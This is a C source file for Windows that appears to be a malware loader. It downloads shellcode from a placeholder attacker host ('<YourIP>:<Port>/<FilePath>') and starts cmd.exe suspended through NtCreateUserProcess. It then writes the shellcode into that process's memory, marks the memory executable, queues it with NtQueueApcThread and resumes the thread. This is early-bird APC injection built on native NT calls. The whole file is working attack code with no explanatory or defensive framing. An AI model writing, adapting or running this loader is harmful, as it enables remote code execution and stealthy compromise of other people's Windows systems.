#include <windows.h>
#include <stdio.h>
#include <wininet.h>
#include <TlHelp32.h>
#include "ntdll.h"

#pragma comment(lib, "ntdll")
#pragma comment (lib, "Wininet.lib")

#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)

BOOL FetchPayload(SIZE_T* sShellCodeSize, PBYTE* pShellCodeAddress){

	HINTERNET hSession = NULL;
	HINTERNET hConnection = NULL;

	PBYTE pTmpBytes = NULL;
	PBYTE pBytes = NULL;

	DWORD dwBytesRead = NULL;
	BOOL bSTATE = TRUE;
	SIZE_T sSize = NULL;

	if (!(hSession = InternetOpenW(NULL, NULL, NULL, NULL, NULL))) {
		printf("InternetOpenW failed");
		goto CLEANUP;
	}

	if (!(hConnection = InternetOpenUrl(hSession, L"<YourIP>:<Port>/<FilePath>", NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL))) {
		printf("InternetOpenUrl failed");
		goto CLEANUP;
	}

	pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);

	if (pTmpBytes == NULL) {
		printf("Error allocating to pTmpBytes");
		goto CLEANUP;
	}

	while (TRUE) {

		if (!InternetReadFile(hConnection, pTmpBytes, 1024, &dwBytesRead)) {
			printf("InternetReadFile failed");
			bSTATE = FALSE;
			goto CLEANUP;
		}

		sSize += dwBytesRead;

		if (!pBytes) {
			pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
		}
		else {
			pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);
		}

		if (!pBytes) {
			bSTATE = FALSE;
			goto CLEANUP;
		}

		memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);
		memset(pTmpBytes, '\0', dwBytesRead);

		if (dwBytesRead < 1024) {
			break;
		}
	}

	*sShellCodeSize = sSize;
	*pShellCodeAddress = pBytes;

	return TRUE;

CLEANUP:
	if (hSession) {
		NtClose(hSession);
	}
	if (hConnection) {
		NtClose(hConnection);
	}
	if (pTmpBytes) {
		LocalFree(pTmpBytes);
	}
	if (pBytes) {
		LocalFree(pBytes);
	}
	return FALSE;
}

int main() {

	HANDLE hProcess = NULL;
	HANDLE hThread = NULL;
	NTSTATUS status = NULL;
	LPVOID rBuffer = NULL;
	SIZE_T numOfBytes = NULL;
	PBYTE shellcode = NULL;
	DWORD dwShellCodeSize = NULL;
	ULONG uOldProtection = NULL;

	OBJECT_ATTRIBUTES POA = { 0 };
	OBJECT_ATTRIBUTES TOA = { 0 };
	PS_CREATE_INFO CI = { 0 };
	PPS_ATTRIBUTE_LIST PPAL = { 0 };
	PS_ATTRIBUTE PA = { 0 };
	PRTL_USER_PROCESS_PARAMETERS PUPP = { 0 };
	UNICODE_STRING US = { 0 };
	CURDIR CurDir = { 0 };
	RTL_DRIVE_LETTER_CURDIR RDLC = { 0 };
	CLIENT_ID CID = { 0 };

	if (!FetchPayload(&dwShellCodeSize, &shellcode)) {
		printf("failed to fetch payload\n");
	}

    RtlInitUnicodeString(&US, (PWSTR)L"\\??\\C:\\Windows\\System32\\cmd.exe");

    RtlCreateProcessParametersEx(&PUPP, &US, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROCESS_PARAMETERS_NORMALIZED);

    POA.Length = sizeof(OBJECT_ATTRIBUTES);
    POA.Attributes = 0x00000040L;

    CI.Size = sizeof(PS_CREATE_INFO);
    CI.State = PsCreateInitialState;

    PPAL = (PS_ATTRIBUTE_LIST*)RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE));
    PPAL->Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
    PPAL->Attributes[0].Size = US.Length;
    PPAL->Attributes[0].Value = (ULONG_PTR)US.Buffer;
    PPAL->TotalLength = sizeof(PS_ATTRIBUTE_LIST) - sizeof(PS_ATTRIBUTE);

    if ((status = NtCreateUserProcess(&hProcess, &hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, CREATE_SUSPENDED, NULL, PUPP, &CI, PPAL)) != STATUS_SUCCESS) {
        goto END;
    }

    if ((status = NtAllocateVirtualMemory(hProcess, &rBuffer, NULL, &dwShellCodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) != STATUS_SUCCESS) {
        printf("0x%lx\n", status);
		goto END;
    }

    if ((status = NtWriteVirtualMemory(hProcess, rBuffer, shellcode, dwShellCodeSize, &numOfBytes)) != STATUS_SUCCESS) {
        printf("0x%lx\n", status);
        goto END;
    }

	if ((status = NtProtectVirtualMemory(hProcess, &rBuffer, &dwShellCodeSize, PAGE_EXECUTE_READ, &uOldProtection)) != STATUS_SUCCESS) {
		printf("NtProtectVirtualMemory failed\n");
		goto END;
	}

    if ((status = NtQueueApcThread(hThread, rBuffer, NULL, NULL, NULL)) != STATUS_SUCCESS) {
        printf("0x%lx\n", status);
        goto END;
    }

	if ((status = NtResumeThread(hThread, NULL)) != STATUS_SUCCESS) {
		printf("0x%lx\n", status);
		goto END;
	}

END:
	RtlFreeHeap(RtlProcessHeap(), 0, PPAL);
	RtlDestroyProcessParameters(PUPP);
	if (hThread) {
		NtClose(hThread);
	}
	if (hProcess) {
		NtClose(hProcess);
	}
	HeapFree(GetProcessHeap(), 0, shellcode);
	system("PAUSE");
	return EXIT_SUCCESS;
}
